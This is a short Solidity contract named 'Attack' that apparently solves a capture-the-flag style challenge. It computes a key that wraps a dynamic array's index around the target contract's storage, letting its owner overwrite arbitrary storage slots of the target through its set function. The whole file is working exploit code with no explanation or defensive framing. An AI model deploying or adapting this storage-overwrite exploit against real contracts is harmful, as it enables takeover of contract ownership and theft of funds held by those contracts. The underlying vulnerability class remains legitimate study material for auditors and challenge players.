pragma solidity ^0.4.21;

interface Map {
    function set(uint256 key, uint256 value) external;
    function get(uint256 key) external view returns (uint256);
}

contract Attack {
    address public owner;
    Map public target;
    uint256 public arrayAt;
    
    function Attack(address _target, uint256 _arrayAt) public {
        target = Map(_target);
        arrayAt = _arrayAt;
        owner = msg.sender;
    }
    
    function set(uint256 _index, uint256 value) public {
        require(owner == msg.sender);
        
        uint256 key = getKey(_index);
        
        target.set(key, value);
    }
    
    function get(uint256 _index) public view returns (uint256) {
        uint256 key = getKey(_index);
        
        return target.get(key);
    }
    
    function getKey(uint256 _index) internal view returns (uint256) {
        uint256 storageLimit = 2**256 - 1;
        uint256 arrayStart = uint256(keccak256(arrayAt));
        
        return storageLimit - arrayStart + 1 + _index;
    }
}
